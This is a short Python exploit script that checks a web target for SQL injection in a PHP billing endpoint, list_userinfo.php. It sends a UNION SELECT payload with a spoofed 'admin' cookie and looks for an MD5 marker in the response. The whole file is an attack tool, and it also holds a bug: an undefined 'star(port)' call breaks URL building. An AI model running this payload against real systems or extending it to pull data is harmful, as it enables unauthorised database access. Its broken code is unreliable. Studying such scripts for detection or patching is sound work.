#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function

import sys
import time
import hashlib
from optparse import OptionParser

try:
    import requests
except ImportError, e:
    print("[-] Requests missing, please install requests module")
    sys.exit(0)



def exploit(domain):
    fate0 = hashlib.md5('fate0').hexdigest()
    cookies = {'cookie': 'admin'}
    evil_url = ("{domain}/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1 union "
                 "select md5(0x6661746530),2,3,4,5%23".format(domain=domain))

    print("[*] Testing payload ...")
    try:
        response = requests.get(evil_url, cookies=cookies, timeout=15)
        if fate0 in response.content:
            print("[+] Target is vulnerable")
            return 1
    except requests.exceptions.Timeout:
        print("[-] Use too much time, exit")
        return 0

    print("[-] Target is not vulnerable")
    return 0


def main():
    domain = sys.argv[1]
    port = sys.argv[2]

    domain = domain if domain.startswith('http') else "http://{domain}:{port}".format(domain=domain,port=star(port))
    domain = domain if not domain.endswith('/') else domain[:-1]

    return exploit(domain)


if __name__ == "__main__":
    main()
